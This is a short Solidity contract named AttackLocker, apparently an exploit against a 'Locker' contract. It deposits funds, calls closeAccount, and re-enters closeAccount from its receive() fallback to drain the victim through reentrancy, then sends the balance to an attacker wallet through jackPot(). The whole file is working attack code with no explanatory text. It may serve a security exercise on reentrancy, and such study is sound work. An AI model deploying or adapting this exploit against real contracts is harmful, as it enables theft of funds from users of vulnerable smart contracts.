pragma solidity =0.8.4;

import "./Locker.sol";

contract AttackLocker {
    Locker public victim;
    address payable public wallet;

    /// send some ethers to attacker
    constructor(address payable _wallet, address payable _victim) payable {
        wallet = _wallet;
        victim = Locker(_victim);
    }

    function attack() public{
        /// create account in locker
        victim.createAcc();

        victim.deposit{value: address(this).balance}();

        // close account and trigger the exploit
        victim.closeAccount();
    }

    receive() external payable {
        victim.closeAccount();
    }

    function jackPot() public {
        wallet.transfer(address(this).balance);
    }
}